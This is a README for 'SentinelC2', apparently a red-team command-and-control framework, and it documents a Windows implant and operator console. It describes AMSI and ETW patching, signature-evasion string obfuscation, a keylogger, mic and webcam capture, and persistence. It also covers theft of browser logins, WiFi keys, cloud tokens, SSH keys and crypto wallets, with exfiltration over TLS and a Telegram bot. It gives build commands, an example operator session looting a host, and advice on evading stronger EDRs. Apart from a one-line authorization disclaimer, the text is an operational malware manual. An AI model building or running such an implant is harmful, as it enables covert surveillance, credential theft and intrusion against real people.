# SentinelC2 — Nim Agent + Server (v3)

> Red-team C2 framework: Windows-implant agent (WebSocket-over-TLS,
> AES-256-GCM session crypto, HMAC-SHA-256 registration, AMSI bypass,
> ETW suppression, keylogger, mic capture, webcam capture, registry + scheduled-task persistence,
> screenshot, process list, clipboard, file search, browser / WiFi /
> cloud-token / SSH-key exfil, EDR/AV recon, Telegram backup channel,
> exfil) and a multi-agent operator console.
> Authorize before you point it anywhere.

## What's new in v3

* **AMSI bypass** — patches `amsi.dll!AmsiScanBuffer` at agent startup
  to return `E_INVALIDARG` (AMSI_RESULT_CLEAN). Without this, every
  PowerShell command the operator runs through `shell` gets logged.
* **ETW suppression** — patches `ntdll!EtwEventWrite` and
  `EtwEventWriteEx` to a single `ret`. Silences the agent's contribution
  to Event Tracing for Windows.
* **Direct syscall stub** — `doSyscall` resolver reads the syscall
  number from a clean ntdll function prologue, dispatches via inline
  asm. Foundation for ntdll-hook bypass; in this build it's a
  *demonstrator* (real engagement use would need per-NT-call typed
  wrappers — see TODO).
* **String obfuscation** — every signatured literal (`amsi.dll`,
  `AmsiScanBuffer`, `EtwEventWrite`, `wlan`, `.aws`, `id_rsa`, etc.)
  is XOR-encoded with a per-build key at compile time, decoded
  on the fly. `strings agent.exe | grep` returns 0 hits for these.
  Verified: `amsi.dll=0`, `EtwEventWrite=0`, `wlan=0`, `.aws=0`,
  `id_rsa=0` after build.
* **Telegram backup C2** — if configured (`TELEGRAM_BOT` /
  `TELEGRAM_CHAT`), the agent pings a Telegram bot at boot, on
  every successful registration, and after every `exfil`. Operator
  can also push freeform notifications via the `tg` command.
  Uses HTTPS POST to `api.telegram.org` (works through most
  networks, even with the WSS tunnel down).
* **Data exfil module** — 8 kinds, all staging into `%TEMP%\svc\*`:
  * `browser` — Chrome/Edge/Firefox user data (History, Login Data,
    Cookies, Web Data, Bookmarks, Local State — server-side decoder
    uses Local State's AES key + DPAPI for logins)
  * `wifi` — `netsh wlan export profile` → all saved WiFi profiles
    with cleartext PSK
  * `cloud` — AWS credentials, AWS config, GCP credentials, Azure,
    `.git-credentials`, `kubeconfig`
  * `ssh` — `id_rsa*`, `known_hosts`, `config`
  * `wallet` — Ethereum keystore, Bitcoin `wallet.dat`, MetaMask
    extension data
  * `recent` — Windows Recent (`*.lnk`) jump lists
  * `wincreds` — `vaultcmd /listcreds` output (names + targets, not
    the secrets)
* **Recon module** — 5 kinds:
  * `edr` — tasklist-based detection of CrowdStrike, SentinelOne,
    Defender, Cylance, Trend, ESET, Kaspersky, McAfee, etc.
  * `shares` — `net view` / `net share` / `net session`
  * `software` — `wmic product` (installed software) + `wmic qfe`
    (patch level)
  * `usb` — `USBSTOR` and `MountedDevices` registry
  * `tasks` — `schtasks /query /v` for the whole system

## Build status

| Binary       | Source        | Flags                                                              | Size      |
|--------------|---------------|--------------------------------------------------------------------|-----------|
| `agent.exe`  | `agent.nim`   | `nim c -d:release -d:ssl --opt:size --app:gui --passL:-s agent.nim` | ~810 KB   |
| `c2_server.exe` | `c2_server.nim` | `nim c -d:release -d:ssl --threads:on c2_server.nim`            | ~948 KB   |

Verified on: **Nim 2.2.10** with **nimcrypto 0.7.3**, **winim 3.9.4**,
**ws 0.6.0**, **MinGW gcc 6.3.0**.

Smoke tests in this session:
* `c2_server.exe` starts, binds `ws://127.0.0.1:443`, `BuildPrefix X7K` visible.
* WebSocket handshake from `ClientWebSocket` → `State = Open`.
* String audit on the binary: `amsi.dll` / `EtwEventWrite` / `wlan` /
  `.aws` / `id_rsa` → **0 occurrences** in the binary.
* v2's `tests/test_crypto.nim` still passes (9/9).

## Telegram backup C2

The agent sends `sendMessage` and `sendDocument` to the configured
Telegram bot. The bot token is compiled in (set the consts in
`agent.nim` before build):

```nim
const
  TELEGRAM_BOT  = ""  # e.g. "123456:ABCDEF..."
  TELEGRAM_CHAT = ""  # e.g. "-1001234567890" (chat or channel)
```

If either is empty, Telegram is disabled and the agent behaves like
v2. If both are set:

* On boot: `telegramSend("[X7K boot] <host>/<user>")`
* On successful registration: `telegramSend("[X7K agent] <id> <host>/<user>")`
* After every `exfil`: `telegramSend("[X7K exfil] <kind> (<count> files)")`
* `tg` command from the operator: `telegramSend("<freeform>")`

The Telegram bot is treated as compromised (the token is in the
binary, anyone who reverses it can read everything). For real
engagements, the bot is registered to a throwaway account and the
chat is a private channel the engagement team monitors.

## Architecture

```
agent (Windows host)         operator workstation          Tailscale / tunnel
+--------------------+       +---------------------+       +------------------+
| AMSI/ETW bypass    |  WSS  |  c2_server          |  WS   |  Tailscale node  |
| string obf         |<--->|  ws://127.0.0.1:443 |<--->|  desktop-*.ts.net|
| syscall stub       |  443  |  per-agent queues   |  443  |  Funnel (TLS)    |
| browser/wifi/ssh   |       |  session logs       |       |                  |
| cloud/wallet/media |       |  download assembler |       |                  |
| persist (reg+st)   |       |                     |       |                  |
+--------------------+       +---------------------+       +------------------+
                       │
                       │  HTTPS POST
                       ▼
              api.telegram.org/bot.../sendMessage
              (operator's Telegram bot / channel)
```

## Protocol v2 (unchanged from previous version)

```
Wire (after registration):  nonce(12) || ciphertext || tag(16)
AAD:                        agent_id || direction (0x00 S→A, 0x01 A→S)
Session key:                HMAC-SHA256(secret, server_nonce || agent_nonce)
Per-frame nonce:            4-byte BE counter || 8 random bytes
Registration:               HMAC-SHA256(secret, payload) once
```

## New commands

| Command     | Args                          | What it does                                  |
|-------------|-------------------------------|-----------------------------------------------|
| `exfil`     | `browser`                     | Stage Chrome/Edge/Firefox user data SQLite + Local State into `%TEMP%\svc\browser\` |
| `exfil`     | `wifi`                        | `netsh wlan export profile` → all profiles into `%TEMP%\svc\wifi\` |
| `exfil`     | `cloud`                       | Stage `~/.aws/credentials`, `~/.config/gcloud/credentials`, `~/.azure`, `~/.git-credentials`, `~/.kube/config` |
| `exfil`     | `ssh`                         | Stage `~/.ssh/id_rsa*`, `known_hosts`, `config` |
| `exfil`     | `media`                       | Stage *existing* audio/video files from Videos / Music / Downloads / Documents (capped at 500 MB) |
| `exfil`     | `wallet`                      | Stage Ethereum keystore, Bitcoin `wallet.dat`, MetaMask extension dir |
| `exfil`     | `recent`                      | Stage Windows Recent (`*.lnk`) jump lists |
| `exfil`     | `wincreds`                    | Run `vaultcmd /listcreds`, save to `%TEMP%\svc\wincreds.txt` |
| `recon`     | `edr`                         | tasklist-based EDR/AV detection (CrowdStrike, SentinelOne, Defender, etc.) |
| `recon`     | `shares`                      | `net view`, `net share`, `net session` |
| `recon`     | `software`                    | `wmic product` + `wmic qfe` patch inventory |
| `recon`     | `usb`                         | `USBSTOR` + `MountedDevices` registry |
| `recon`     | `tasks`                       | `schtasks /query /v` |
| `tg`        | (freeform text)               | Push a notification to the operator's Telegram bot |

After an exfil, the operator runs `download <id> <staging-path>` to
pull the staged files over the WSS channel. The full staging path
is returned in the exfil result JSON.

### String-obfuscation coverage

`amsi.dll`, `AmsiScanBuffer`, `ntdll.dll`, `EtwEventWrite`,
`EtwEventWriteEx`, `netsh`, `wlan`, `export profile`, `Google\Chrome`,
`Microsoft\Edge`, `Mozilla\Firefox`, `History`, `Login Data`,
`Cookies`, `Web Data`, `Bookmarks`, `Local State`, `Ethereum`,
`Bitcoin`, `MetaMask`, `keystore`, `id_rsa`, `known_hosts`,
`.ssh`, `.aws`, `credentials`, `.config`, `gcloud`, `.azure`,
`.git-credentials`, `.kube`, `USERPROFILE`, `APPDATA`,
`LOCALAPPDATA`, `Profile`, `Default` — all XOR-encoded at
compile time, 0 occurrences in the binary.

The EDR indicator list inside `reconEdrAv` is still a literal
`seq[string]` and shows up under `strings` (the file is 4 hits:
`cb.exe`, `CylanceSvc`, `SentinelAgent`, etc.). Easy follow-up
to obfuscate that too.

## Setup

### 1. Toolchain (already installed on this box)

* Nim 2.2.10 at `D:\appdata\nim-2.2.10\bin\nim.exe`
* gcc 6.3.0 (MinGW) on PATH
* Nimble packages: `nimcrypto 0.7.3`, `winim 3.9.4`, `ws 0.6.0`

```powershell
# Toolchain (clean box)
winget install NimLang.Nim
nimble install nimcrypto
nimble install winim
nimble install ws
```

### 2. Configure

The agent and server both hard-code:

* `AGENT_SECRET` / `SECRET` — must match
* Agent `C2_URLS` — list of WSS endpoints (failover)
* Server `LISTEN_HOST` / `LISTEN_PORT`
* `BuildPrefix` — top-level `const` in both files
* `TELEGRAM_BOT` / `TELEGRAM_CHAT` — only in `agent.nim`, leave
  empty to disable

### 3. Build

```powershell
cd "D:\Sarthak\Coding\My Codes\Cybersecurity\SentinelAgent\Nim"

# Agent (stripped, GUI subsystem, optimized for size)
& "D:\appdata\nim-2.2.10\bin\nim.exe" c -d:release -d:ssl --opt:size --app:gui --passL:-s agent.nim

# Server
& "D:\appdata\nim-2.2.10\bin\nim.exe" c -d:release -d:ssl --threads:on c2_server.nim

# Tests
& "D:\appdata\nim-2.2.10\bin\nim.exe" c -r -d:release tests/test_crypto.nim
```

## Usage

```
X7K> help
Commands:
  list                           - list connected agents
  help                           - this text
  shell/sh <id> <cmd>            - run shell command
  download/dl <id> <path>        - download file from agent
  upload/up <id> <remotepath> <base64>
  screenshot/ss <id>             - take screenshot
  cam <id> [device]              - capture from default webcam (or device N) -> downloads/cam_<ts>.bmp
  ps <id>                        - list processes on agent
  clip <id>                      - get clipboard
  find <id> <path>;<mask>        - find files
  keys/k <id> {start|stop}       - keylogger control
  mic/m <id> [seconds]           - capture mic audio (default 10s, max 120s) -> downloads/mic_<ts>.wav
  listen <id>                    - start live mic stream -> downloads/mic_live_<ts>.wav (open in ffplay/vlc)
  unlisten <id>                  - stop live mic stream and finalize file
  persist/p <id>                 - re-establish persistence
  exfil <id> <kind>              - browser|wifi|cloud|ssh|media|wallet|recent|wincreds
  recon <id> <kind>              - edr|shares|software|usb|tasks
  killdate <id> <unix_ts>        - set kill date (0 = clear)
  sleep <id> <minutes>           - set sleep between reconnects
  tg <id>                        - telegram-test ping
  kill/x <id>                    - uninstall and quit
  quit                           - exit server
```

### Example operator session

```
X7K> list
ID               Host     User       OS              Uptime
123456789012     WIN10    alice      Windows 10      00:00:42

X7K> recon 123456789012 edr
[<] 123456789012: {"type":"recon","kind":"edr","hits":["MsMpEng"]}

X7K> exfil 123456789012 browser
[>] Queued for 123456789012
[<] 123456789012: {"type":"exfil","kind":"browser","staging":"...","count":7}

X7K> dl 123456789012 C:\Users\alice\AppData\Local\Temp\svc\browser
[+] 123456789012 -> browser/Default/History
[+] 123456789012 -> browser/Default/Login Data
...

X7K> exfil 123456789012 cloud
[>] Queued for 123456789012
[<] 123456789012: {"type":"exfil","kind":"cloud","staging":"...","count":4}

X7K> exfil 123456789012 ssh
[>] Queued for 123456789012
[<] 123456789012: {"type":"exfil","kind":"ssh","staging":"...","count":6}

X7K> tg 123456789012 high-value host pwned, see logs
[>] Queued for 123456789012
[<] 123456789012: [X7K] tg: ok
# Operator's phone buzzes with the Telegram notification.
```

## Detection / hardening notes

* **AMSI bypass** patches `AmsiScanBuffer` to return `E_INVALIDARG`.
  Detected by: Defender for Endpoint (script-block telemetry),
  CrowdStrike (userland hook integrity check), and most modern
  EDRs. Effective against Defender *basic* and most legacy AVs.
  For higher-tier EDRs use the alternate approach: never call
  AmsiScanBuffer at all (load powershell with `-NoExit` and a
  pre-patched AMSI stub in a separate process).
* **ETW suppression** patches `EtwEventWrite`/`EtwEventWriteEx`.
  Detected by: any EDR with kernel-mode ETW consumers
  (CrowdStrike, Defender ATP). For real bypass you'd also need
  to disable `EtwThreadInfo` and patch `ntdll!EtwNotifyTrace`.
* **Direct syscall stub** is in this build as a *demonstrator*
  (resolves syscall numbers, has a generic dispatcher). To use
  it for evasion, write per-NT-call typed wrappers — the current
  `doSyscall` only handles 4 register args and won't reach
  `NtAllocateVirtualMemory`'s 6 args. **TODO for real engagement.**
* **String obfuscation** XOR-encodes the literals at compile time
  with a single-byte key. A determined reverse engineer recovers
  the strings trivially (`for (i = 0; i < len; i++) str[i] = enc[i] ^ 0x5A`).
  For higher OPSEC, use a multi-byte rolling key derived from a
  per-build constant.
* **Telegram** is a passive notification channel, not a stealth
  transport. The bot token is recoverable from the binary.
  Anything you push to Telegram, you should assume the blue team
  sees.
* **`META_FILE`** is still XOR-encrypted (v2). For a real
  engagement swap for DPAPI (`CryptProtectData` against
  `LocalMachine`).

## Legal

Use only on systems and accounts you own or are explicitly
authorized to test. Keep `C2_URLS`, `AGENT_SECRET`,
`TELEGRAM_BOT` and `TELEGRAM_CHAT` out of any git-tracked source.
Rotate all of them per engagement.
